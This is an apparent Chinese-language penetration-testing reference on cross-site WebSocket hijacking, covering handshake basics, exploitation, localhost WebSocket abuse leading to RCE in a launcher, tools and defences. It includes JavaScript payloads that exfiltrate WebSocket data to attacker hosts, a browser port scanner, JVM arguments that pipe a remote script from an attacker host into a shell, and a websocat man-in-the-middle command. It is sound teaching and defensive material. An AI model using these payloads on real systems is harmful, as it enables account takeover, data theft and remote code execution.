---
attack_surface: [认证/授权绕过, 客户端利用, 配置缺陷]
impact: [身份伪造, 信息泄露, 完整性破坏]
risk_level: 高
prerequisites:
  - WebSocket 协议基础
  - Cookie/SameSite 机制理解
  - CSRF 攻击原理
  - JavaScript 基础
difficulty: 中级
related_techniques:
  - csrf-cross-site-request-forgery
  - h2c-smuggling
  - race-condition
  - prototype-pollution
tools:
  - Burp Suite
  - websocat
  - STEWS
  - wsrepl
  - WSSiP
---

# CSWSH — Cross-Site WebSocket Hijacking（跨站 WebSocket 劫持）

> 关联文档：[CSRF](../Cross%20Site%20Request%20Forgery/README.md) · [H2C Smuggling](../../../Proxies/H2C%20Smuggling/README.md) · [Race Condition](../../../../Other%20Helpful%20Vulnerabilities/Race%20Condition/README.md) · [Prototype Pollution](../../Reflected%20Values/Prototype%20Pollution/README.md)

---

# 0x01 背景与原理

## 1.1 WebSocket 协议基础

WebSocket 通过**一次 HTTP 升级握手**建立长连接，之后在同一个 TCP 连接上进行双向帧通信。与 HTTP 的请求-响应模型不同，WebSocket 允许服务端随时主动推送消息，广泛用于实时数据推送、聊天、协作编辑、金融行情等场景。

**握手流程**：

浏览器发起升级请求：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

服务端确认升级（101 Switching Protocols）：

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

**关键特征**：
- 握手阶段的 Cookie 被**浏览器自动附加**（与普通 HTTP 请求相同）
- 握手完成后，TCP 连接升级为 WebSocket 帧协议，不再遵循 HTTP 语义
- `Sec-WebSocket-Key` / `Sec-WebSocket-Accept` 用于确认服务端意图，**非认证用途**

## 1.2 什么是 CSWSH

Cross-Site WebSocket Hijacking（CSWSH）是 CSRF 在 WebSocket 场景下的等价攻击。当 WebSocket 握手**仅依赖 HTTP Cookie 进行认证**，且服务端**不验证 `Origin` Header**时，攻击者托管的恶意页面可以发起跨站 WebSocket 连接，以受害者身份与服务端交互。

**根因**：WebSocket 握手阶段的 Cookie 自动附加机制 + 服务端缺失 Origin 校验 = 攻击者可借用受害者会话。

```
[受害者浏览器] ---访问恶意页面---> [攻击者服务器]
      │                                  │
      │ 自动携带 target.com 的 Cookie       │ 恶意 JS 发起 WebSocket 连接
      ↓                                  ↓
[target.com WebSocket 端点] <---ws://或wss:// 连接（含受害者 Cookie）---
      │
      └→ 服务端将连接关联到受害者会话 → 攻击者可收发受害者数据
```

## 1.3 为什么 CSWSH 比普通 CSRF 更危险

| 维度 | 普通 CSRF | CSWSH |
|------|---------|-------|
| **请求方向** | 单向（攻击者仅发送请求） | **双向**（攻击者可读取服务端响应/推送） |
| **持久性** | 单次请求-响应 | **长连接**，可持续窃取实时数据 |
| **数据泄露** | 受限于 CORS 读限制 | **全双工通道**，服务端推送全部可读 |
| **SameSite 防御** | `Lax` 阻止 POST 但仍允许 GET | `Lax` 仍阻止 WebSocket 升级（关键差异） |

---

# 0x02 前提条件

CSWSH 利用需同时满足以下条件：

1. **WebSocket 认证基于 Cookie** — 握手阶段通过 Cookie 识别用户身份
2. **Cookie 对攻击者页面可达** — 通常需要 `SameSite=None`；或受害者浏览器未启用 Total Cookie Protection（Firefox）/ 第三方 Cookie 阻止（Chrome）
3. **WebSocket 服务端不检查 Origin** — 或 Origin 校验可被绕过
4. **特殊场景：localhost / 内网 WebSocket** — 浏览器对 `127.0.0.1` / 内网地址的 WebSocket 连接**不强制同源策略**，且 SameSite 不阻止 localhost 连接，几乎总是可利用

> **Firefox Total Cookie Protection** — 将 Cookie 隔离到创建它们的站点，攻击者页面无法访问目标站点的 Cookie，使 CSWSH 不可用。
> **Chrome 第三方 Cookie 阻止** — 同样可阻止认证 Cookie 被发送到 WebSocket 服务端。

---

# 0x03 攻击分类

- **攻击面**：认证/授权绕过、客户端利用、配置缺陷
- **影响维度**：身份伪造、信息泄露、完整性破坏
- **风险等级**：**高**（单次用户交互实现双向会话劫持）

| CSWSH 子类型 | 目标 | 认证方式 | 关键绕过 |
|-------------|------|---------|---------|
| **基础 CSWSH** | 公网 WebSocket 端点 | Cookie (SameSite=None) | 缺失 Origin 校验 |
| **Gorilla CheckOrigin** | Go WebSocket 服务 | Cookie 或无认证 | `CheckOrigin: func(r *http.Request) bool { return true }` |
| **子域名 XSS → CSWSH** | 同组织子域名 WebSocket | Cookie (Domain 共享) | 子域 XSS 绕过 Origin 限制 |
| **localhost WebSocket 滥用** | 桌面应用本地 IPC (`127.0.0.1`) | 无认证或 token 文件 | 浏览器不对 localhost 强制 SOP |
| **内网端口扫描 + RCE** | 本地 JSON-RPC WebSocket | 无认证 | 链式调用 create + launch 方法注入 JVM 参数 |

---

# 0x04 利用技术

## 4.1 基础 CSWSH Payload

当 WebSocket 握手仅依赖 Cookie 认证且不检查 Origin 时：

```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");  // 发送触发消息，获取敏感数据
}
function handleReply(event) {
  // 将服务端返回的敏感数据外传到攻击者服务器
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```

**攻击流程**：
1. 受害者访问攻击者页面
2. JavaScript 发起 `wss://victim.com/ws` 连接
3. 浏览器自动附加 `victim.com` 的 Cookie
4. 服务端将 WebSocket 连接关联到受害者会话
5. 攻击者页面通过 `onmessage` 回调接收服务端推送的受害者数据
6. 通过 `fetch` 外传到攻击者服务器

## 4.2 Gorilla WebSocket — CheckOrigin 始终返回 true

Gorilla（Go 语言 WebSocket 库）中，开发者常将 `CheckOrigin` 设为始终 `true`，接受任意 `Origin` 的握手。如果端点同时**缺乏认证**，任何页面都可以直接升级连接并读写消息：

```html
<script>
const ws = new WebSocket("ws://victim-host:8025/api/v1/websocket");
ws.onmessage = (ev) => fetch("https://attacker.tld/steal?d=" + encodeURIComponent(ev.data), {mode: "no-cors"});
</script>
```

**影响**：实时窃取流数据（如邮件推送、通知），无需受害者凭据。

## 4.3 子域名 XSS → CSWSH

当攻击者在目标域名的**子域名**中获得 JavaScript 执行能力（如 Gitpod Workspace XSS），且 WebSocket 端点不严格检查 Origin：

1. 攻击者在 `attacker.gitpod.io` 上执行 JavaScript
2. 发起 WebSocket 连接到 `api.gitpod.io`（父域 WebSocket）
3. Cookie 因 Domain 设置为 `.gitpod.io` 而被自动发送
4. WebSocket 不检查 Origin → 以受害者身份通信 → 窃取 Token

**实际案例**：[Snyk 披露的 Gitpod RCE](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) — 通过子域名 XSS 建立 CSWSH，窃取 WebSocket Token 实现 RCE。

## 4.4 wsHook — 中间人劫持 WebSocket 通信

复制目标应用的 HTML 文件，注入 `wsHook.js` 拦截所有 WebSocket 消息：

```javascript
// 加载 wsHook 库
;<script src="wsHook.js"></script>

// 拦截客户端发往服务端的消息
wsHook.before = function (data, url) {
  var xhttp = new XMLHttpRequest()
  xhttp.open("GET", "client_msg?m=" + data, true)
  xhttp.send()
}

// 拦截服务端发往客户端的消息
wsHook.after = function (messageEvent, url, wsObject) {
  var xhttp = new XMLHttpRequest()
  xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
  xhttp.send()
  return messageEvent
}
```

部署方式：

```bash
# 克隆 wsHook.js 到同目录
# https://github.com/skepticfx/wshook
sudo python3 -m http.server 80
```

诱导受害者访问攻击者托管的"克隆版"页面 → 所有 WebSocket 通信被劫持。

---

# 0x05 Localhost WebSocket 滥用

## 5.1 原理：为什么 localhost WebSocket 更脆弱

浏览器对 `127.0.0.1` / `localhost` 的 WebSocket 连接**不强制同源策略**，且 SameSite Cookie 策略不阻止 localhost 连接。桌面应用（启动器、更新器、开发工具）经常在 `127.0.0.1` 随机端口暴露 JSON-RPC WebSocket，且通常**完全跳过 Origin 校验和认证**。

**攻击前提**：
- 目标应用在 localhost 暴露 WebSocket IPC 端点
- 端点无 Origin 校验、无二次认证
- 端口已知或可通过扫描发现

## 5.2 浏览器端口扫描

Chromium 可容忍约 16k 次 WebSocket 握手失败才触发限流，足以扫描 ephemeral 端口范围：

```javascript
async function findLocalWs(start = 20000, end = 36000) {
  for (let port = start; port <= end; port++) {
    await new Promise((resolve) => {
      const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
      let settled = false;
      const finish = () => { if (!settled) { settled = true; resolve(); } };
      ws.onerror = ws.onclose = finish;
      ws.onopen = () => {
        console.log(`Found candidate on ${port}`);
        ws.close();
        finish();
      };
    });
  }
}
```

> **Firefox 限制**：数百次失败后即崩溃或冻结，实际 PoC 通常针对 Chromium。

## 5.3 JSON-RPC 链式调用 → RCE（CurseForge 案例）

CurseForge 桌面启动器的 `CurseAgent.exe` 在 `127.0.0.1:<random>` 暴露 JSON-RPC WebSocket，帧格式为：

```json
{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}
```

**攻击链**：
1. **端口扫描** — 定位 WebSocket 端口
2. **`createModpack`** — 无需用户交互，返回新的 `MinecraftInstanceGuid`
3. **`minecraftTaskLaunchInstance`** — 启动该 GUID，注入 `AdditionalJavaArguments` 参数
4. **JVM 诊断选项 RCE** — 通过 JVM 参数执行命令：

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```

Unix 环境等效：

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="/bin/sh -c 'curl https://attacker/p.sh | sh'"
```

**通用模式**：`create resource → privileged launch` 出现在许多更新器和启动器中。只要方法 (1) 返回服务端跟踪的标识符，方法 (2) 用该标识符执行代码或启动进程，就检查用户可控参数是否能被注入。

---

# 0x06 攻击链与联动

## 6.1 CSWSH → 数据窃取 → 账户接管

```
[恶意页面 CSWSH 连接]
    → [WebSocket 全双工通道]
    → [读取实时消息（含 Token/密码/会话）]
    → [账户接管]
```

## 6.2 子域名 XSS → CSWSH → API Token 窃取

```
[子域名 XSS 执行]
    → [WebSocket 连接到父域 API（Cookie 自动附加）]
    → [通过 WebSocket 调用 API 获取 Token]
    → [Token 用于外部 API 访问]
```

## 6.3 恶意页面 → localhost 端口扫描 → JSON-RPC → RCE

```
[受害者访问攻击者页面]
    → [JS 扫描 127.0.0.1 开放 WebSocket 端口]
    → [发现本地 IPC 端点（如 CurseAgent.exe）]
    → [JSON-RPC 链式调用: createModpack → launchInstance]
    → [注入 JVM 参数 → 执行任意命令]
```

## 6.4 CSWSH + Prototype Pollution（Socket.IO）

通过 WebSocket/Socket.IO 发送 `__proto__` 污染载荷，影响服务端 Express 内部状态：

```json
{"__proto__":{"initialPacket":"Polluted"}}
```

若服务行为改变（如 echo 包含 "Polluted"），则成功污染服务端原型，可进一步与 Node.js 原型污染利用链联动。

---

# 0x07 WebSocket 工具速查

## 7.1 调试与代理

| 工具 | 功能 | 链接 |
|------|------|------|
| **Burp Suite** | WebSocket MitM、拦截、修改、历史记录 | [portswigger.net](https://portswigger.net/burp) |
| **socketsleuth** | Burp 扩展 — WebSocket 历史、拦截规则、Intruder、AutoRepeater | [GitHub](https://github.com/snyk/socketsleuth) |
| **WSSiP** | WebSocket/Socket.IO 代理，捕获、拦截、发送自定义消息 | [GitHub](https://github.com/nccgroup/wssip) |
| **wsrepl** | 交互式 WebSocket REPL，专为渗透测试设计 | [GitHub](https://github.com/doyensec/wsrepl) |

## 7.2 CLI 与在线工具

| 工具 | 功能 |
|------|------|
| **websocat** | 命令行 WebSocket 客户端/服务端，支持 `--insecure` 和 TLS | 
| **websocketking.com** | 在线 WebSocket 客户端 |
| **hoppscotch.io** | 在线多协议客户端（含 WebSocket） |

```bash
# websocat 连接示例
websocat --insecure wss://10.10.10.10:8000 -v

# 创建 WebSocket 服务器
websocat -s 0.0.0.0:8000

# MitM WebSocket（配合 ARP Spoofing）
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```

## 7.3 自动化扫描

| 工具 | 功能 |
|------|------|
| **STEWS** | WebSocket 发现、指纹识别、已知漏洞检测 |
| **WebSocket Turbo Intruder** | Burp 扩展 — 高速 WebSocket Fuzzing、竞态测试、DoS |
| **Backslash Powered Scanner** | 含 WebSocket 消息 Fuzzing 支持 |

---

# 0x08 防御策略

## 8.1 服务端防御

| 防御层 | 措施 | 防护范围 |
|--------|------|---------|
| **Origin 校验** | WebSocket 握手阶段严格验证 `Origin` Header，拒绝非预期来源 | 阻止跨站连接 |
| **Token 认证** | 使用 URL 参数或首条消息中的认证 Token（而非仅 Cookie） | Cookie 不再作为唯一认证因子 |
| **CSRF Token** | 在 WebSocket 握手 URL 中加入随机 Token | 攻击者无法预测 Token |
| **SameSite Cookie** | `SameSite=Strict` / `SameSite=Lax` | 浏览器不在跨站 WebSocket 握手时发送 Cookie |
| **二次认证** | 敏感 WebSocket 操作需额外验证（如密码确认） | 即使连接建立也无法执行危险操作 |

## 8.2 浏览器层防御

- **Firefox Total Cookie Protection** — 将 Cookie 隔离到创建站点，跨站攻击者页面无法访问目标 Cookie → CSWSH 彻底失效
- **Chrome 第三方 Cookie 阻止** — 阻止第三方上下文中的 Cookie 发送
- **Chrome 默认 SameSite=Lax** — 注意创建后前 2 分钟 Cookie 行为为 `None`（短暂窗口期）

## 8.3 开发实践

1. **Gorilla WebSocket** — 不要将 `CheckOrigin` 设为 `return true`；检查 `Origin` 是否在白名单中
2. **localhost IPC 端点** — 必须验证 Origin（浏览器发送的 `Origin: http://malicious.com`），禁止仅依赖 `127.0.0.1` 绑定作为安全措施
3. **桌面应用 WebSocket** — 使用随机 Token 文件认证（如 `~/.app/token`），而非仅依赖 loopback 绑定
4. **Socket.IO** — 同样受 CSWSH 影响，需同等程度的 Origin 校验

## 8.4 检测清单

- [ ] WebSocket 端点是否验证 `Origin` Header？
- [ ] 认证是否仅依赖 Cookie？是否可加入 Token 参数？
- [ ] `SameSite` Cookie 属性是否设置为 `Strict` 或 `Lax`？
- [ ] localhost WebSocket 是否对非浏览器客户端也开放？
- [ ] WebSocket 消息中是否包含敏感数据（Token、密码、个人信息）？

---

# 0x09 其他 WebSocket 攻击向量速查

| 攻击向量 | 说明 | 关联文档 |
|---------|------|---------|
| **WebSocket Smuggling** | 利用 H2C 升级绕过反向代理限制 | H2C Smuggling |
| **Race Conditions** | 多连接并发发送消息触发竞态 | Race Condition |
| **Prototype Pollution** | 通过 Socket.IO 消息污染服务端原型 | Prototype Pollution |
| **Frame DoS** | 声明超大 payload 长度触发 OOM | — |

---

# 0x0A 参考资料

- [PortSwigger — WebSocket Security](https://portswigger.net/web-security/websockets)
- [IncludeSecurity — CSWSH Exploitation in 2025](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [Snyk — Gitpod RCE via WebSocket Hijacking](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)
- [elliott.diy — When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [InfoSec Writeups — Cross-Site WebSocket Hijacking (CSWSH)](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)
- [wsHook — WebSocket Hook Library](https://github.com/skepticfx/wshook)
- [PortSwigger — WebSocket Turbo Intruder](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [PortSwigger — Server-side Prototype Pollution via WebSocket](https://portswigger.net/research/server-side-prototype-pollution)
- [STEWS — WebSocket Vulnerability Scanner](https://github.com/PalindromeLabs/STEWS)
- [wsrepl — Interactive WebSocket REPL](https://github.com/doyensec/wsrepl)
